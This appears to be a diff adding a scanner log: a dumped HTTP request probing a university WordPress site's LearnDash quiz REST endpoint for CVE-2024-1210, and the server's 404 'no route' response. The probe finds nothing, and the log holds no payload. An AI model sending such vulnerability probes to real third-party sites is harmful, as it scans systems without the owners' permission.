@@ -1,0 +1,29 @@
+[CVE-2024-1210] Dumped HTTP request for https://ess.science.unimelb.edu.au/wp-json/ldlms/v1/sfwd-quiz
+
+
+GET /wp-json/ldlms/v1/sfwd-quiz HTTP/1.1
+Host: ess.science.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[CVE-2024-1210] Dumped HTTP response https://ess.science.unimelb.edu.au/wp-json/ldlms/v1/sfwd-quiz
+
+HTTP/1.1 404 Not Found
+Connection: close
+Transfer-Encoding: chunked
+Access-Control-Allow-Headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type
+Access-Control-Expose-Headers: X-WP-Total, X-WP-TotalPages, Link
+Content-Type: application/json; charset=UTF-8
+Date: Wed, 06 Aug 2025 15:17:42 GMT
+Link: <https://ess.science.unimelb.edu.au/wp-json/>; rel="https://api.w.org/"
+Server: openresty
+Vary: Cookie
+Vary: Origin
+X-Content-Type-Options: nosniff
+X-Robots-Tag: noindex
+
+{"code":"rest_no_route","message":"No route was found matching the URL and request method.","data":{"status":404}}
